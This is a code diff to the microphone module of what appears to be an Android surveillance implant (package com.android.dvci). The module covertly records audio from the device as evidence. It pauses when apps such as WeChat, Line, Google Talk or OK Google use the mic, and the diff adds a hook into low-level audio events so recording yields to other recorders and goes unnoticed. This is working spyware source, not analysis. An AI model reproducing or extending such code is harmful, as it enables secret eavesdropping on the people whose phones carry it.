@@ -10,42 +10,42 @@
 package com.android.dvci.module;
 
 import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
 import android.os.PowerManager;
-import android.speech.RecognizerIntent;
 
-import com.android.dvci.Call;
 import com.android.dvci.ProcessInfo;
-import com.android.dvci.ProcessStatus;
 import com.android.dvci.Standby;
 import com.android.dvci.StateRun;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
+import com.android.dvci.event.LowEvent.AudioEvent;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
+import com.android.dvci.interfaces.IProcessObserver;
 import com.android.dvci.interfaces.Observer;
-import com.android.dvci.listener.ListenerCall;
+import com.android.dvci.listener.Listener;
 import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.listener.ListenerStandby;
+import com.android.dvci.listener.LowEventAudioManager;
 import com.android.dvci.manager.ManagerModule;
+import com.android.dvci.module.message.LowEventAudio;
+import com.android.dvci.module.message.LowEventSms;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 import java.io.File;
 import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.HashSet;
-import java.util.List;
 import java.util.Set;
 
 /**
@@ -54,7 +54,7 @@ import java.util.Set;
  * @author zeno
  * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  */
-public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener {
+public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener, IProcessObserver, Observer<LowEventAudio> {
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final String STOP_REASON_PROCESS = "BLACKLISTED_PROCESS"; //$NON-NLS-1$
@@ -79,6 +79,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	public Set<String> blacklist = new HashSet<String>();
 	private PowerManager pm = null;
 	private int amp_zero_count = 0;
+	private boolean uselowLevelNotification = false;
 
 	public ModuleMic() {
 		super();
@@ -106,7 +107,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		addBlacklist(M.e("com.tencent.mm"));
 		addBlacklist(M.e("jp.naver.line.android"));
 		addBlacklist(M.e("com.google.android.talk"));
-		if (isSpeechRecognitionActivityPresented()) {
+		if (Utils.isSpeechRecognitionActivityPresent()) {
 			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
 		} else {
 			if (Cfg.DEBUG) {
@@ -115,27 +116,6 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		}
 	}
 
-	/**
-     * Checks availability of speech recognizing Activity
-     *
-     * @return true – if Activity there available, false – if Activity is absent
-     */
-    private static boolean isSpeechRecognitionActivityPresented() {
-        try {
-            // getting an instance of package manager
-            PackageManager pm = Status.getAppContext().getPackageManager();
-            // a list of activities, which can process speech recognition Intent
-            List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);
-
-            if (activities.size() != 0) {    // if list not empty
-                return true;                // then we can recognize the speech
-            }
-        } catch (Exception e) {
-
-        }
-
-        return false; // we have no activities to recognize the speech
-    }
 	public synchronized void addBlacklist(String black) {
 		blacklist.add(black);
 	}
@@ -150,11 +130,35 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
+	/**
+	 *
+	 * @return lowLevel notification settings
 	 */
+	public boolean isUselowLevelNotification() {
+		return uselowLevelNotification;
+	}
+
+	/**
+	 * Settings are configured only if ModuleMic isn't already started
+	 * @param uselowLevelNotification sets lowLevel notification settings
+	 *
+	 */
+
+	public  void setUselowLevelNotification(boolean uselowLevelNotification) {
+		if(status != StateRun.STARTED) {
+			this.uselowLevelNotification = uselowLevelNotification;
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setUselowLevelNotification): unable to change lowLevel setting, Module already started");
+			}
+		}
+	}
+
+	/*
+		 * (non-Javadoc)
+		 *
+		 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
+		 */
 	@Override
 	public boolean parse(ConfModule conf) {
 		setPeriod(MIC_PERIOD);
@@ -204,6 +208,9 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
 			}
 			ListenerStandby.self().attach(standbyObserver);
+			if( isUselowLevelNotification() ) {
+				LowEventAudioManager.self().attach(this);
+			}
 			if (canRecordMic()) {
 				startRecord();
 
@@ -254,6 +261,9 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
 		}
 		removePhoneListener();
+		if( isUselowLevelNotification() ) {
+			LowEventAudioManager.self().detach(this);
+		}
 		ListenerStandby.self().detach(standbyObserver);
 		standbyObserver=null;
 		specificStop();
@@ -532,6 +542,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	private boolean isForegroundBlacklist() {
 
+		if(LowEventAudioManager.self().isInstrumented()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (isForegroundBlacklist) instrument running skippig list check ");
+			}
+			return false;
+		}
 		String foreground = Status.self().getForeground();
 
 		if (Cfg.DEBUG) {
@@ -643,5 +659,54 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	@Override
 	public String getTag() {
 		return TAG;
+	}
+
+	@Override
+	public int notification(final LowEventAudio b) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification)");//$NON-NLS-1$
+		}
+		if(b.audio_data !=null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) sub_type="+b.audio_data.sub_type);//$NON-NLS-1$
+			}
+			if (b.audio_data.sub_type == AudioEvent.AUDIO_REC_INIT || b.audio_data.sub_type == AudioEvent.AUDIO_REC_START) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): STOP RECORD");//$NON-NLS-1$
+				}
+
+			/*
+				if (b.audio_data.className.contains(Status.OK_GOOGLE_ACTIVITY)) {
+					if (pm != null && !pm.isScreenOn()) {
+						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
+						return false;
+					}
+					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+						addStop(Status.STOP_REASON_OK_GOOGLE);
+					}
+				}else{
+				*/
+				if (!inStoplist(STOP_REASON_PROCESS)) {
+					addStop(STOP_REASON_PROCESS);
+				}
+				//}
+
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): START RECORD");//$NON-NLS-1$
+				}
+				if (inStoplist(STOP_REASON_PROCESS)) {
+					removeStop(STOP_REASON_PROCESS);
+				}
+				if (inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+					removeStop(Status.STOP_REASON_OK_GOOGLE);
+				}
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification):b.audio_data null");//$NON-NLS-1$
+			}
+		}
+		return 0;
 	}
 }
